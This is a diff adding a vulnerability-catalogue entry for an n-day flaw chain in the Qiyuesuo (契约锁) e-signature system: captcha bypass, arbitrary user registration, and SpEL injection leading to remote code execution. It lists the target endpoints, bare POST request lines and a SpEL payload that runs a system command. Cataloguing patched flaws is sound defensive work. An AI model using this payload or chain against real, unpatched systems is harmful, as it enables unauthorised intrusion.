@@ -1,0 +1,14 @@
+vendor = "契约锁"
+name = "契约锁电子签章系统登录接口组合漏洞链"
+type = "逻辑漏洞组合（验证码绕过 + 任意用户注册 + SPEL注入RCE）"
+version = "契约锁电子签章系统 2024年各版本（所有漏洞厂商均已修复）"
+path = "/login/pin /login /template/html/add"
+detail = """POST /login/pin HTTP/1.1 Host: target
+POST /login HTTP/1.1 Host: target
+POST /template/html/add HTTP/1.1 Host: target Content-Type: application/json
+
+SpEL: ${T(java.lang.Runtime).getRuntime().exec("id")}"""
+fix = "升级至官方最新版"
+date = 20260201
+label = "nday"
+verifier = "AdySec"
